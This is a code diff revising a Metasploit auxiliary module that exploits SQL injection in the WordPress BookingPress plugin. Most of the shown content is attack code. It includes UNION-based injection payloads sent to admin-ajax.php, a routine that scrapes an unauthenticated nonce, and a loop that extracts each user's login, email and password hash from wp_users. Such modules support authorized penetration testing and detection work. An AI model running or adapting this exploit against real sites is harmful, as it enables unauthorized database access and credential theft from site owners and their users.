@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('BOOKING_PRESS_PAGE', [ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
+      OptString.new('TARGETURI',[ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
     ])
   end
 
@@ -49,9 +49,9 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri, '/wp-admin/admin-ajax.php'),
+      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
       'vars_post' =>
-                                generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
+          generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
     })
 
     return Exploit::CheckCode::Vulnerable if res&.code == 200 && res.body.include?('bookingpress_service_position')
@@ -62,12 +62,14 @@ class MetasploitModule < Msf::Auxiliary
   def get_number_of_users
     res = send_request_cgi({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri, '/wp-admin/admin-ajax.php'),
+      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
       'vars_post' =>
-                               generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
+         generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
     })
 
-    number_of_users = JSON.parse(res&.body)[0]['bookingpress_service_position'].to_i
+    fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract the number of users from the database') if res.nil?
+
+    number_of_users = res.get_json_document[0]['bookingpress_service_position'].to_i
     fail_with(Failure::UnexpectedReply, 'Unable to extract the number of users from the database') unless number_of_users.is_a? Integer
 
     number_of_users
@@ -85,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_user_nonce
     res = send_request_cgi({
       'method' => 'POST',
-      'uri' => normalize_uri(target_uri, datastore['BOOKING_PRESS_PAGE'])
+      'uri' => normalize_uri(datastore['TARGETURI'])
     })
 
     return 'Unable to get wp-nonce for an unauthenticated user' unless res&.body&.match("_wpnonce:'(\\w+)' };")
@@ -110,11 +112,13 @@ class MetasploitModule < Msf::Auxiliary
     while i < number_of_users
       res = send_request_cgi({
         'method' => 'POST',
-        'uri' => normalize_uri(target_uri, '/wp-admin/admin-ajax.php'),
+        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
         'vars_post' => generate_vars_post(") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset #{i}-- -")
       })
 
-      fail_with(Failure::UnexpectedReply, 'Unable to retrieve JSON response from SQL injection') unless JSON.parse(res&.body)[0].is_a? Hash
+      fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract credentials from the database') if res.nil?
+
+      fail_with(Failure::UnexpectedReply, 'Unable to retrieve JSON response from SQL injection') unless res.get_json_document[0].is_a? Hash
       parsed_json = JSON.parse(res&.body)[0]
 
       unless parsed_json.key?('bookingpress_service_id') && parsed_json.key?('bookingpress_category_id') && parsed_json.key?('bookingpress_service_name')
